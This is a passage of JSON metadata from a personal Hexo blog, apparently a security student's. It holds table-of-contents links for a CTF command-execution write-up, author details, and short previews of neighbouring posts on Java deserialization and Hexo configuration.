href=\"#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-love-math-%E9%9A%BE%E5%BA%A68-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">攻防世界 love_math(难度8)命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-20\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wp-20\"><span class=\"toc-text\">wp</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-10\"><span class=\"toc-text\">总结</span></a></li></ol></li></ol>","author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"java反序列化","uid":"7873af0b12d3f7cc53b7d970bb6378b1","slug":"java反序列化","date":"2023-08-07T02:18:56.000Z","updated":"2023-09-08T06:35:15.599Z","comments":true,"path":"api/articles/java反序列化.json","keywords":null,"cover":[],"text":"java序列化和反序列化 Click to see more public class Animal &#123; private String color; public Animal() &#123;//没有无参构造将会报错 System.out.println(\"调用 An...","link":"","photos":[],"count_time":{"symbolsCount":"6.9k","symbolsTime":"6 mins."},"categories":[],"tags":[{"name":"java","slug":"java","count":2,"path":"api/tags/java.json"}],"author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"hexo_config","uid":"4c90b088c95eb83a9985c879c9096e11","slug":"hexo-config","date":"2023-08-01T01:58:58.000Z","updated":"2023-08-01T10:25:45.632Z","comments":true,"path":"api/articles/hexo-config.json","keywords":null,"cover":null,"text":"hexo 图片配置头像配置 不知道为什么，hexo无法访问图床图片 在设置头像时，创建source/images/picture.jpg ，在该文件夹下放图片 运行时，可以用localhost:4000/images/picture.jpg访问到 在_config.aurora....","link":"","photos":[],"count_time":{"symbolsCount":183,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"hexo","slug":"hexo","count":1,"path":"api/tags/hexo.json"}],"author":{"name":"XyM4ster","slug":"blog-author","avatar":"/images/picture.jpg","link":"/","description":"热爱网络安全的BITer","socials":{"github":"https://github.com/XyM4ster","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}